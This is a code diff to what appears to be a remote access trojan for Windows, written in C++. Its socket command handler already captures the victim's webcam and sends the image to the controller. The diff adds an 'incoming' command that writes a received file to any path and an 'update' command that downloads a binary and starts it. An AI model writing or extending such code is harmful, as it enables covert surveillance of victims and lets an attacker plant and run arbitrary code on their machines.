@@ -29,8 +29,9 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <intrin.h>
-#include <string>
 #include <iostream>
+#include <string>
+#include <sstream>
 
 #pragma comment (lib, "Ws2_32.lib")
 #pragma comment (lib, "Mswsock.lib")
@@ -103,9 +104,37 @@ void handle(char *buff, BOOL *listen, BOOL *loop) {
 
   } else if (cmd == "shutdown") {
     utils::shutdown();
+
   } else if (cmd == "webcam") {
     utils::captureWebcam((char*)"C:\\wc.bmp");
     net::sendFile(&sock, (char*)"C:\\wc.bmp");
+
+  } else if (cmd == "incoming") {
+    std::stringstream ss;
+    ss.str(args);
+    std::string sizeb;
+    std::string path;
+    std::getline(ss, sizeb, '^');
+    std::getline(ss, path);
+
+    unsigned int size = (unsigned int)atoi(sizeb.c_str());
+    printf("\nTry download %d bytes in %s\n", size, path.c_str());
+    net::recieveFile(size, (char*)path.c_str());
+
+  } else if (cmd == "update") {
+    std::stringstream ss;
+    ss.str(args);
+    std::string sizeb;
+    std::string path;
+    std::getline(ss, sizeb, '^');
+    std::getline(ss, path);
+
+    unsigned int size = (unsigned int)atoi(sizeb.c_str());
+    printf("\nTry download update %d bytes in %s\n", size, path.c_str());
+    net::recieveFile(size, (char*)path.c_str());
+    utils::startup("bin.exe");
+    *listen = FALSE;
+    *loop = FALSE;
   }
 }
 
